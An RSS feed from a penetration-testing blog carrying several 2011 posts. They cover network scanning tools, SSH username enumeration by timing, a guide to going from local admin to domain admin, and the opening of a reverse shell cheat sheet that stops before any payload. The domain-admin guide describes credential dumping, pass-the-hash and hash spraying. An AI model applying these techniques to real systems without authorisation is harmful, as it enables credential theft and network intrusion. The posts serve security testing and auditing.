<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>pentest &#8211; pentestmonkey</title>
	<atom:link href="https://pentestmonkey.net/tag/pentest/feed" rel="self" type="application/rss+xml" />
	<link>https://pentestmonkey.net</link>
	<description>Taking the monkey work out of pentesting</description>
	<lastBuildDate>Wed, 25 Jan 2012 21:11:34 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.8.3</generator>
	<item>
		<title>windows-privesc-check</title>
		<link>https://pentestmonkey.net/tools/windows-privesc-check</link>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Tue, 20 Dec 2011 06:04:27 +0000</pubDate>
				<category><![CDATA[Audit]]></category>
		<category><![CDATA[Tools]]></category>
		<category><![CDATA[audit]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[windows]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=541</guid>

					<description><![CDATA[A long time ago, I started writing a tool to look for local privilegeÂ escalationÂ vectorsÂ on Windows systems &#8211; e.g. weak permissions on files, directories, service registy keys. Â I never quite got round to finishing it, but the project could still be useful to pentesters and auditors in its current part-finished state. I&#8217;d suggest giving it a [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>A long time ago, I started writing a tool to look for <a href="http://code.google.com/p/windows-privesc-check/wiki/DesignGoals">local privilegeÂ escalationÂ vectors</a>Â on Windows systems &#8211; e.g. weak permissions on files, directories, service registy keys. Â I never quite got round to finishing it, but the project could still be useful to pentesters and auditors in its current part-finished state.</p>
<p>I&#8217;d suggest giving it a try next time you do a security audit with local administrator rights, or next time you get a non-admin logon to a Windows system during a pentest. Â It was designed to be useful for both.</p>
<p><a href="http://code.google.com/p/windows-privesc-check/source/browse/#svn%2Ftrunk">Trunk</a> contains the best all-round version. It checks some file, directory, registry and service permissions (among other things). Â Reports are in HTML.</p>
<p>The newer <a href="http://code.google.com/p/windows-privesc-check/source/browse/#svn%2Fbranches%2Fwpc-2.0">wpc-2.0 branch</a> does a better job at auditing Windows services &#8211; but does little else. Â Reports are in text only.</p>
<p>You only need to download the .exe file. Full source code is available too, though. Â It&#8217;s written in Python, uses <a href="http://sourceforge.net/projects/pywin32/files/pywin32/">pywin32</a>Â and &#8220;compiled&#8221; with <a href="http://www.pyinstaller.org/">pyinstaller</a>. You don&#8217;t need to download any dependencies (even python) unless you&#8217;re planning to <a href="http://code.google.com/p/windows-privesc-check/wiki/BuildingTheExecutable">build the .exe yourself</a>.</p>
<h2>FAQ</h2>
<h3>Why 2 versions?</h3>
<p>The code in &#8220;trunk&#8221; wasn&#8217;t object-oriented, making it harder to work with. Â I rewrote it to create the &#8220;wpc-2.0&#8221; branch. Much better &#8211; but alas, not finished.</p>
<h3>Can I see the source code?</h3>
<p>Yes, it&#8217;s on <a href="http://code.google.com/p/windows-privesc-check/source/browse/">google code</a> along with the executables.</p>
<h3>Will the program elevate privileges for me?</h3>
<p>No. Â It gives you a report describing any potential vulnerabilities it finds, but doesn&#8217;t have any autopwn features. Â This is mostly to reduce the risk of my codeÂ accidentallyÂ breaking your client&#8217;s system <img src="https://s.w.org/images/core/emoji/13.1.0/72x72/1f642.png" alt="ðŸ™‚" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Finding IP Addresses of Other Network Interfaces on Linux</title>
		<link>https://pentestmonkey.net/uncategorized/finding-ip-addresses-of-other-network-interfaces-on-linux</link>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 16 Oct 2011 16:12:34 +0000</pubDate>
				<category><![CDATA[Uncategorized]]></category>
		<category><![CDATA[ipstackquirks]]></category>
		<category><![CDATA[pentest]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=497</guid>

					<description><![CDATA[The scenario for this post is that you&#8217;re connected to the local LAN of the systems you&#8217;re pentesting &#8211; possibly in a DMZ or multi-tiered architecture. Â If you&#8217;re on an externally-facing LAN, you may find that there aren&#8217;t many network services to explore. As your pentest starts to look more like a vulnerability assessment, you [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>The scenario for this post is that you&#8217;re connected to the local LAN of the systems you&#8217;re pentesting &#8211; possibly in a DMZ or multi-tiered architecture. Â If you&#8217;re on an externally-facing LAN, you may find that there aren&#8217;t many network services to explore.</p>
<p>As your pentest starts to look more like a vulnerability assessment, you might start thinking about the following:</p>
<ul>
<li>How many of these systems are multihomed?</li>
<li>What network services are accessible on the other interfaces?</li>
</ul>
<p>In modern network architectures, systems often have a mangement LAN interface, or a backup LAN interface and potentially other interfaces that are more interesting than the one you&#8217;re looking at.</p>
<p>If you can find the IP addresses of these other interfaces, you might be able to pentest a few more interesting network services from your vantage point on the external network segment.</p>
<h2>Finding IP Addresses of Remote Network Interfaces</h2>
<p>If you&#8217;re lucky you&#8217;ll be able to use <a href="http://linux.die.net/man/1/snmpnetstat">SNMP</a>Â (generic) or a &#8220;<a href="http://www.nessus.org/plugins/index.php?view=single&amp;id=43815">special NetBOIS query</a>&#8221; (Windows only) to list all the IP address of a system.</p>
<p>If this doesn&#8217;t work, you might be able to bruteforce the IP addresses using ARP queries.</p>
<p>Linux hosts will respond to ARP requests for all of their IP addresses on all of their Interfaces.Â  Â i.e. a multi-homed host might respond to both of these probes from the LAN you&#8217;re on:</p>
<pre>arp-scan 10.0.0.99
arp-scan 192.168.0.99</pre>
<p>This is counter-intuitive. Â If you&#8217;re like me, you&#8217;d probably expect the target system to only answer ARP requests for IPs on the same LAN as the client. Indeed Solaris, Windows and AIX behave as expected.</p>
<p>When ARP scanning, your source IP address might be important (so also try 0.0.0.0). Â Reasoning for this is discussed further <a href="http://pentestmonkey.net/blog/the-science-of-safely-finding-an-unused-ip-address">here</a>Â and <a href="http://www.nta-monitor.com/wiki/index.php/Arp-scan_User_Guide#Using_arp-scan_for_system_fingerprinting">here</a>.</p>
<p>Using <a href="http://www.nta-monitor.com/tools/arp-scan/">arp-scan</a>, a Class B can be scanned in 36 secs on my test system, using 3% CPU and 1 MB/s bandwidth:</p>
<pre>#Â arp-scan --bandwidth=1M --retry=1 --arpspa=1.1.1.1 172.16.1.0/16</pre>
<p>So it&#8217;s just about practical to scan 10.0.0.0/8, 172.16.0.0/12 and 192.168.0.0/16. It should take less than 3 hours and would cover all hosts on the local subnet if you used broadcast ARP requests. Â To do this for 4 source addresses would take 12 hours, which is a more significant amount of time.</p>
<p>If for some reason you don&#8217;t want to use broadcast ARP requests (maybe you&#8217;re not authorised to test the whole LAN), you can unicast requests by specifying the destination MAC address:</p>
<pre>#Â arp-scan --bandwidth=1M --retry=1 --arpspa=1.1.1.1 --destaddr=00:11:22:33:44:55 172.16.1.0/16</pre>
<h3>How to Fix</h3>
<p>ChangingÂ the <a href="http://www.linuxinsight.com/proc_sys_net_ipv4_conf_eth0_arp_ignore.html">arp_ignore</a> option in /proc from 0 (default) to 1 will remedy the aboveÂ behavior.</p>
<pre>echo 1 &gt; /proc/sys/net/ipv4/conf/all/arp_ignore</pre>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>gateway-finder</title>
		<link>https://pentestmonkey.net/tools/gateway-finder</link>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 09 Oct 2011 16:02:38 +0000</pubDate>
				<category><![CDATA[Misc]]></category>
		<category><![CDATA[Tools]]></category>
		<category><![CDATA[discovery]]></category>
		<category><![CDATA[gateway]]></category>
		<category><![CDATA[network]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[tool]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=520</guid>

					<description><![CDATA[Gateway-finder is a scapy script that will help you determine which of the systems on the local LAN has IP forwarding enabled and which can reach the Internet. This can be useful during Internal pentests when you want to quickly check for unauthorised routes to the Internet (e.g. rogue wireless access points)Â or routes to other [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>Gateway-finder is a <a href="http://www.secdev.org/projects/scapy/">scapy</a> script that will help you determine which of the systems on the local LAN has IP forwarding enabled and which can reach the Internet.</p>
<p>This can be useful during Internal pentests when you want to quickly check for unauthorised routes to the Internet (e.g. rogue wireless access points)Â or routes to other Internal LANs. Â It doesn&#8217;t perform a hugely thorough check, but it is quick at least. Â It&#8217;s python, so it should be easy to modify if you need it to do something moreÂ sophisticated.</p>
<h3>Download</h3>
<p><a href="https://github.com/pentestmonkey/gateway-finder">https://github.com/pentestmonkey/gateway-finder</a></p>
<p><span class="Apple-style-span" style="color: #000000; font-size: 17px; line-height: 25px;">Overview</span></p>
<p>You give the script the IP address of a system on the Internet you&#8217;re trying to reach and it will send the following probes via each system on the local LAN:</p>
<ul>
<li>An ICMP Ping</li>
<li>A TCP SYN packet to port 80</li>
<li>An ICMP Ping with a TTL of 1</li>
<li>A TCP SYN packet to port 80 with a TTL of 1</li>
</ul>
<p>It will report separately which systems send an ICMP &#8220;TTL exceeded in transit&#8221; message back (indicating that they&#8217;re routers) and which respond to the probe (indicating that they&#8217;re gateways to the Internet).</p>
<h3>Dependencies</h3>
<p>Python and Scapy. Â On Debian / Ubuntu you should just need to do this:</p>
<pre># apt-get install python-scapy</pre>
<h3>Usage</h3>
<pre># python gateway-finder.py -h
Usage: gateway-finder.py [ -I interface ] -i ip -f macs.txt

Tries to find a layer-3 gateway to the Internet.  Attempts to reach an IP
address using ICMP ping and TCP SYN to port 80 via each potential gateway
in macs.txt (ARP scan to find MACs)

Options:
  -h, --help            show this help message and exit
  -i IP, --ip=IP        Internet IP to probe
  -v, --verbose         Verbose output
  -I INTERFACE, --interface=INTERFACE
                        Network interface to use
  -f MACFILE, --macfil=MACFILE
                        File containing MAC addresses</pre>
<h3>Step 1: Run an ARP scan to identify systems on the local LAN</h3>
<p>Use your favourite ARP scanning to identify systems on the local LAN. Save the output (I use to arp.txt in the example below).</p>
<pre># arp-scan -l | tee arp.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.6: 256 hosts scanned in 2.099 seconds (121.96 hosts/sec).  3 responded</pre>
<h3>Step 2: Run gateway-finder on the list of local systems</h3>
<p>Gateway-finder needs two bits of input from you:</p>
<ul>
<li>The MAC addresses of the potential gateways</li>
<li>The IP address of a system on the Internet (I use a google.com address in the example below):</li>
</ul>
<p>If arp.txt also contains an IP of each system on the same line as the MAC, you&#8217;ll get much nicer output. Â If you need to use a different network interface, use the -I option.</p>
<pre># python gateway-finder.py -f arp.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder

[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in arp.txt
[+] 00:13:72:09:AD:76 [10.0.0.100] appears to route ICMP Ping packets to 209.85.227.99.  Received ICMP TTL Exceeded in transit response.
[+] 00:13:72:09:AD:76 [10.0.0.100] appears to route TCP packets 209.85.227.99:80.  Received ICMP TTL Exceeded in transit response.
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] Done</pre>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>timing-attack-checker</title>
		<link>https://pentestmonkey.net/tools/timing-attack-checker</link>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 25 Sep 2011 15:39:22 +0000</pubDate>
				<category><![CDATA[Misc]]></category>
		<category><![CDATA[Tools]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[perl]]></category>
		<category><![CDATA[tool]]></category>
		<category><![CDATA[userenumeration]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=595</guid>

					<description><![CDATA[timing-attack-checker is a simple PERL script that helps you check for timing attacks. The most common form of timing attack I&#8217;ve noticed while pentesting is that the server may take longer to respond to a valid username than to an invalid username. Â This can be handy for bruteforcing a list of valid usernames. Â I&#8217;ll work [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>timing-attack-checker is a simple PERL script that helps you check for timing attacks.</p>
<p>The most common form of timing attack I&#8217;ve noticed while pentesting is that the server may take longer to respond to a valid username than to an invalid username. Â This can be handy for bruteforcing a list of valid usernames. Â I&#8217;ll work through an example of such an attack below.</p>
<p>The script could also be used to test other types of timing attack. Â It should provide microsecond-resolution timing.</p>
<p>In its simplest form, you give it two commands you want it to record the execution time of. Â It will run those commands 100 times (by default), recording how long it takes.</p>
<pre style="font-family: 'Courier 10 Pitch', Courier, monospace; color: #222222; line-height: 21px; font: normal normal normal 12px/18px Consolas, Monaco, monospace; background-image: initial; background-attachment: initial; background-origin: initial; background-clip: initial; background-color: #f7f7f7; margin-bottom: 24px; font-size: 15px; background-position: initial initial; background-repeat: initial initial; padding: 1.5em;">timing-attack-check.pl 'login.pl -u knownuser -p x' 'login.pl -u notexist -p x'</pre>
<p>The data is optionally saved in tab-delimited format for import into a spreadsheet. Â Some raw stats are also output to help you decide if you&#8217;ve found a timing attack or not.</p>
<h3>Download</h3>
<p>Get the latest version from <a href="https://github.com/pentestmonkey/timing-attack-checker">github</a></p>
<h3>Usage</h3>
<pre>timing-attack-checker v1.0 http://pentestmonkey.net/tools/timing-attack-checker

Usage: timing-attack-check.pl [ options ] 'cmd1' 'cmd2' ['cmd3' ...]

options are:
  -n N      Number of times to run the commands
  -o file   File to write tab delimited data to

Example:
  timing-attack-check.pl 'login.pl -u knownuser -p x' 'login.pl -u notexist -p x'</pre>
<h3>Dependencies</h3>
<ul>
<li>PERL</li>
<li>Linux (because I use /dev/null for some output)</li>
<li>Time::HiRes module (probably installed by default &#8211; it is on Ubuntu 11.04)</li>
</ul>
<h3>Worked Example</h3>
<p>I set up an SSH server that only allowed logins using keys, not passwords. Â I wanted to know if the server would take longer to respond to a login attempt for a valid username than for an invalid username &#8211; presumably it does less work if the username is invalid. Â I load an SSH key into my ssh-agent so that the SSH client offers it to the server for each login attempt.</p>
<p>I used the following usernames for testing:</p>
<ul>
<li>&#8220;x&#8221; the name of an account that exists. Â It also has an ~/.ssh/authorized_keys file</li>
<li>&#8220;y&#8221; the name of a non-existent account.</li>
<li>&#8220;z&#8221; the name of an account that exists. Â It has no ~/.ssh/authorized_keys file</li>
</ul>
<p>I had an ssh-agent running that had one key loaded. Â The key was not authorised to log into any account on the target system:</p>
<pre>$ ssh-keygen -f key1
$ eval `ssh-agent`
$ ssh-add key1</pre>
<p>I ran the following command to make 40 login attempts for each:</p>
<pre>$ timing-attack-checker.pl -o data.txt -n 40 'ssh x@host' 'ssh y@host' 'ssh z@host'</pre>
<p>The script output the following:</p>
<pre>[D] Running command: ssh x@host
[D] Command took 0.464256 secs
[D] Running command: ssh y@host
[D] Command took 0.115495 secs
[D] Running command: ssh z@host
[D] Command took 0.128768 secs
[D] Running command: ssh x@host
[D] Command took 0.125885 secs
[D] Running command: ssh y@host
... snip ...
=================================================
Results for: ssh x@host
Average time: 0.143035425
Minimum time: 0.10777
Maximum time: 0.464256
Standard deviation: 0.0608662980593068 (i.e. 68% of times within 1 sd, 95% within 2 sd)
Was fastest on 3 out of 40 occassions (7.5% of the time)
Was slowest on 10 out of 40 occassions (25% of the time)
=================================================
Results for: ssh y@host
Average time: 0.120723175
Minimum time: 0.095311
Maximum time: 0.206071
Standard deviation: 0.0171279751063684 (i.e. 68% of times within 1 sd, 95% within 2 sd)
Was fastest on 36 out of 40 occassions (90% of the time)
Was slowest on 3 out of 40 occassions (7.5% of the time)
=================================================
Results for: ssh z@host
Average time: 0.132942175
Minimum time: 0.114824
Maximum time: 0.154482
Standard deviation: 0.00611497853997666 (i.e. 68% of times within 1 sd, 95% within 2 sd)
Was fastest on 1 out of 40 occassions (2.5% of the time)
Was slowest on 27 out of 40 occassions (67.5% of the time)
=================================================
[+] Saving tab-delimited data to data.txt</pre>
<p>There are a lot of stats there. Â Let&#8217;s discuss each in turn an see if it leads us to believe that there&#8217;s a username enumeration issue:</p>
<ul>
<li>Average time: This ranges from about 0.12 secs to 0.14 secs. Â That&#8217;s a difference of more than 10%. Â It&#8217;s alsoÂ comparableÂ to a standard deviation (depending which of the 3 you use). Â It could be random noise caused by the laggy wireless network I ran it over. Â &#8220;x&#8221; looks pretty slow. Â &#8220;y&#8221; looks pretty fast.</li>
<li>Min/Max time: The min and max times for each login attempt would ideally be very similar. Â We see that for some usernames the max is 2x or 4x higher than the min. Â This shows we might have a choppy network connection. Â Or maybe the client or server is busy. Â This min/max helps to show the consistency (or otherwise) of the data collected. Â Our samples aren&#8217;t particularly consistent.</li>
<li><a href="http://en.wikipedia.org/wiki/Standard_deviation">Standard Deviation</a>: How close our samples are to the average. Â If themin/max of your sample set are similar and the difference between average login time for &#8220;x&#8221; and &#8220;y&#8221; (say) is more than 2 standard deviations, I think you can be pretty sure you&#8217;ve found a timing attack. Â That doesn&#8217;t apply to the data we collected here (more like 1 sd).</li>
<li>Fastest/Slowest: Shows how consistently a command was the fastest/slowest in its round. Â This can be useful for busy network/hosts if you can assume that all attempts will be slowed down consistently by network/host problems. Â Logins were faster for &#8220;y&#8221; on 90% attempts, compared to the 33% you&#8217;d expect if no timing attack was present. Â This seems quite compelling evidence that we can detect accounts that don&#8217;t exist &#8211; remember &#8220;y&#8221; doesn&#8217;t exist.</li>
</ul>
<p>So in conclusion, it seems that it would be possible to bruteforce a list of usernames that exist on the server tested. Â If anyone wants to look further into this issue, I&#8217;ve included details on my config at the end of this post.</p>
<p>More generally, you&#8217;ll probably want to run only two commands, not three or more. Â The option is there if you need it, though.</p>
<h3>Notes on SSH Server Config</h3>
<p>OS: Ubuntu 11.04</p>
<p>SSH Daemon:Â OpenSSH_5.8p1 (package:Â openssh-server 1:5.8p1-1ubuntu3)</p>
<p>Changes to default /etc/ssh/sshd_config:</p>
<pre>PasswordAuthentication no
Port 12345</pre>
<p>CPU:Â AMD Athlon(tm) 64 X2 Dual Core Processor 5000+</p>
<p>RAM: 2GB</p>
<p>Network: Wireless connection capable of around 3.5 MB/sec</p>
<p>Server was idle during testing.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Exposing only part of C: over Terminal Services</title>
		<link>https://pentestmonkey.net/uncategorized/exposing-only-part-of-c-over-terminal-services</link>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 18 Sep 2011 16:12:40 +0000</pubDate>
				<category><![CDATA[Uncategorized]]></category>
		<category><![CDATA[audit]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[terminalservices]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=473</guid>

					<description><![CDATA[Ken Johnson gives a useful tip on his blog about limiting access to your local drives when you make a Terminal Services connection. Â This is not new, but it&#8217;s useful enough to be worthÂ summarizing here. When I audit a system via Terminal Services, I usually map a drive to or from the system depending on [&#8230;]]]></description>
										<content:encoded><![CDATA[<p><a href="http://www.nynaeve.net/?page_id=2">Ken Johnson</a> gives a useful tip on his blog about <a href="http://www.nynaeve.net/?p=176">limiting access to your local drives</a> when you make a Terminal Services connection. Â This is not new, but it&#8217;s useful enough to be worthÂ summarizing here.</p>
<p>When I audit a system via Terminal Services, I usually map a drive to or from the system depending on what the Firewall will allow.</p>
<p>Sometimes, it won&#8217;t allow either, though. Â In those cases one of the few options remaining is to configure mstsc.exe to expose a local drive on your client system to the server, accessing it via \\tsclient. Â But, you probably want to avoid exposing your whole C: drive.</p>
<p>Assuming that you didn&#8217;t have the foresight to create a dedicated partition for this purpose (I didn&#8217;t), you can easily simulate a drive using subst:</p>
<pre>subst s: c:\share</pre>
<p>Then you can configure mstsc.exe to only share your S: drive, leaving you less exposed.</p>
<p>Nice tip, Ken.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Post-Exploitation in Windows: From Local Admin To Domain Admin (efficiently)</title>
		<link>https://pentestmonkey.net/uncategorized/from-local-admin-to-domain-admin</link>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 11 Sep 2011 16:28:06 +0000</pubDate>
				<category><![CDATA[Uncategorized]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[windows]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=479</guid>

					<description><![CDATA[There are some excellent tools and techniques available to pentesters trying to convert their local admin rights into domain admin rights. Â This page seeks to provide a reminder of some of the most common and useful techniques as well as rating their effectiveness to suggest which ones to try first. The premise of all the [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>There are some excellent tools and techniques available to pentesters trying to convert their local admin rights into domain admin rights. Â This page seeks to provide a reminder of some of the most common and useful techniques as well as rating their effectiveness to suggest which ones to try first.</p>
<p>The premise of all the techniques is to obtain access to as many domain accounts as possible using the credentials stored on the domain member you&#8217;ve compromised.</p>
<p>Tools are briefly discussed for each technique. Â This page is really about the techniques, though, not the tools. Â While tools will change, I suspect these techniques will be with us for some considerable time yet.</p>
<p>I&#8217;ve tried to rate each technique in order of how much effort it is for the pentester. Â Some technqiues give almost instant results and are therefore worth trying first. Â Others require password cracking and are a last resort really if nothing else works.</p>
<h3>Very Quick: Duplicate Access Tokens (Incognito)</h3>
<p><a href="http://sourceforge.net/projects/incognito/">Incognito</a>, either as a standalone tool, or via <a href="http://carnal0wnage.attackresearch.com/2008/05/token-passing-with-incognito-part-2.html">metasploit&#8217;s meterpreter</a> will scan through all the running processes on the box and list you the delegation tokens it finds. Â Without doing any analysis yourself you can try creating a domain admin account with each token. Â If it succeeds without any effort on your part, so much the better.</p>
<p>If you don&#8217;t succeed in getting a domain admin account straight away, you may still be able to abuse the privileges of a normal domain user (e.g. to list domain accounts and group memberships). Â Perhaps try the techniques below before trying too hard&#8230;</p>
<h3>Quick: Dump LSA Secrets (lsadump)</h3>
<p>If any Windows services are running under a domain account, then the passwords for those accounts must be stored locally in a reversible format. Â <a href="http://packetstormsecurity.org/files/view/10457/lsadump2.zip">LSAdump2</a>, <a href="http://www.nirsoft.net/utils/lsa_secrets_dump.html">LSASecretsDump</a>, <a href="http://packetstormsecurity.org/files/view/62371/PWDumpX14.zip">pwdumpx</a>, gsecdump or <a href="http://www.oxid.it/cain.html">Cain &amp; Abel</a> can recover these.</p>
<p>You might have to stare at the output of lsadump and the list of services in</p>
<p>After you&#8217;ve correlated plain text passwords from the &#8220;_SC_&lt;service name&gt;&#8221; sections of LSAdump with the domain usernames from services.msc using the short &#8220;service name&#8221;, you should a list of domain accounts and cleartext passwords.</p>
<p>Investigate your new found accounts and see if you&#8217;re domain admin yet.</p>
<h3>Quick: Dump SAM-Style Hashes for Access Tokens (WCE)</h3>
<p><a href="http://www.ampliasecurity.com/research/wcefaq.html">Windows Credentials Editor</a>Â (a more mature version of the nowÂ obsoleteÂ <a href="http://oss.coresecurity.com/projects/pshtoolkit.htm">Pass The Hash Toolkit</a>) recovers the SAM-style password hash for eachÂ processÂ from LSASS &#8211; including domain accounts. Â Initially, this has a similar effect to Incognito. Â But has a couple of advantages:</p>
<ul>
<li>You can authenticate using the hash long after the corresponding process has terminated or the system has been rebooted. Â You can do this using <a href="http://www.ampliasecurity.com/research/wcefaq.html">WCE</a> itself, or use tools like <a href="http://technet.microsoft.com/en-us/sysinternals/bb897553">psexec</a>Â (<a href="http://www.windowsecurity.com/articles/PsExec-Nasty-Things-It-Can-Do.html">example here</a>),Â <a href="http://blog.tenablesecurity.com/2007/06/lmntlm-hash-sup.html">smbshell</a>Â and <a href="http://www.offensive-security.com/metasploit-unleashed/PSexec_Pass_The_Hash">metasploit&#8217;s psexec</a>Â to authenticate using a password hash instead of a password.</li>
<li>You can try the password hash in conjunction with a different username (or all usernames) using <a href="http://code.google.com/p/keimpx/">keimpx</a>, or similar. Â You&#8217;re hoping for password reuse at this stage.</li>
</ul>
<p>Gsecdump is an alternative tool for obtaining password hashes for running processes.</p>
<p>If SAM-style hashes aren&#8217;t sufficient for some reason, <a href="http://www.ampliasecurity.com/research/wce12_uba_ampliasecurity_eng.pdf">WCE can also steal kerberos tickets</a>Â (PDF link)Â &#8211; e.g. to authenticate to unix systems. Â Pass-the-ticket as opposed to pass-the-hash.</p>
<h3>Quick: Dump SAM, Spray Hashes</h3>
<p>Dumping the password hashes from the local SAM using <a href="http://www.foofus.net/~fizzgig/fgdump/">fgdump</a>, <a href="http://www.tarasco.org/security/pwdump_7/">pwdump7</a>,Â <a href="http://www.oxid.it/cain.html">Cain &amp; Abel</a>, etc. won&#8217;t necessarily get you a domain account, but if one of the local passwords is the same as one of the domain passwords, you might be in luck. Â <a href="http://code.google.com/p/keimpx/">Keimpx</a>Â will help you try the hashes again the domain accounts.</p>
<p>Careful not to lock the domain accounts out, though!</p>
<p>It&#8217;s probably worth spraying the hashes against the local accounts on other systems. Â If you fail to get domain admin, you might get local admin on every other system if the local admin passwords are the same. Â You can then rinse and repeat the techniques on this page until you get your domain admin account.</p>
<h3>Slow: Cracking SAM-Style Password Hashes Crack Passwords</h3>
<p>If you&#8217;ve already tried authenticating using the hashes you&#8217;ve collected and you&#8217;ve tried hashes against other accounts, there&#8217;s probably little value in cracking the passwords. Â <a href="http://www.openwall.com/john/">John the Ripper</a>, <a href="http://www.oxid.it/cain.html">Cain &amp; Abel</a>Â andÂ <a href="http://ophcrack.sourceforge.net/">ophcrack</a>Â are just a few of the password crackers available.</p>
<p>You might find a pattern in the passwords used. Â Possibly crack hashes from the password history too.</p>
<p>Another reason to crack passwords is if you&#8217;reÂ targetingÂ a service that insists on youÂ knowingÂ the password &#8211; e.g. Terminal Services.</p>
<p>It&#8217;s starting to feel like a longshot now&#8230;</p>
<h3>Very Slow: Dump Cached Domain Logons, Crack</h3>
<p>If the domain member has cached domain logons, you might be able to recover passwords from the corresponding hashes (e.g. using Â <a href="http://www.foofus.net/~fizzgig/fgdump/">fgdump</a>,Â <a href="http://packetstormsecurity.org/files/view/62371/PWDumpX14.zip">pwdumpx</a>,Â <a href="http://www.hacktoolrepository.com/files/Passwords/CacheDump/cachedump-1.2.zip">cachedump</a>, <a href="http://www.room362.com/blog/2011/2/14/cachedump-for-meterpreter-in-action.html">meterpreter</a>). Â However, hashes are salted and they&#8217;re caseÂ sensitive. Â If there&#8217;s a reasonable password policy, you&#8217;re going to need some luck.</p>
<p>You can&#8217;t use these hashes without cracking them &#8211; unlike the SAM-style hashes.</p>
<h3>Other Techniques</h3>
<p>There are of course other many other techniques you could try. Â Some are more open-ended or less likely to succeed in the general case. Â Here are a few ideas:</p>
<ul>
<li>Trawling the filesystem looking for passwords. Â <a href="http://support.microsoft.com/kb/155197">Unattend.txt</a>Â might have an admin password in it if present. Â You can probably recover the SAM from .vhd files. Â Other backup files may also yield passwords.</li>
<li>Trawling the registry. Â Credentials such as VNC password and SNMP community string can be recovered. Â They might be useful on your quest for domain admin.</li>
<li>ProtectedÂ Storage. Â  This mightÂ yieldÂ passwords that are reused elsewhere.</li>
</ul>
<p>&nbsp;</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Reverse Shell Cheat Sheet</title>
		<link>https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</link>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 04 Sep 2011 15:50:49 +0000</pubDate>
				<category><![CDATA[Shells]]></category>
		<category><![CDATA[bash]]></category>
		<category><![CDATA[cheatsheet]]></category>
		<category><![CDATA[netcat]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[perl]]></category>
		<category><![CDATA[php]]></category>
		<category><![CDATA[python]]></category>
		<category><![CDATA[reverseshell]]></category>
		<category><![CDATA[ruby]]></category>
		<category><![CDATA[xterm]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=175</guid>

					<description><![CDATA[If you&#8217;re lucky enough to find a command executionÂ vulnerabilityÂ during a penetration test, pretty soon afterwards you&#8217;ll probably want an interactive shell. If it&#8217;s not possible to add a new account / SSH key / .rhosts file and just log in, your next step is likely to be either trowing back a reverse shell or binding [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>If you&#8217;re lucky enough to find a command executionÂ vulnerabilityÂ during a penetration test, pretty soon afterwards you&#8217;ll probably want an interactive shell.</p>
<p>If it&#8217;s not possible to add a new account / SSH key / .rhosts file and just log in, your next step is likely to be either trowing back a reverse shell or binding a shell to a TCP port. Â This page deals with the former.</p>
<p>Your options for creating a reverse shell are limited by the scripting languages installed on the target system &#8211; though you could probably upload a binary program too if you&#8217;re suitably well prepared.</p>
<p>The examples shown are tailored to Unix-like systems. Â Some of the examples below should also work on Windows if you use substitute &#8220;/bin/sh -i&#8221; with &#8220;cmd.exe&#8221;.</p>
<p>Each of the methods below is aimed to be a one-liner that you can copy/paste. Â As such they&#8217;re quite short lines, but not very readable.</p>
<h3>Bash</h3>
<p>Some versions of <a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/">bash can send you a reverse shell</a> (this was tested on Ubuntu 10.10):</p>
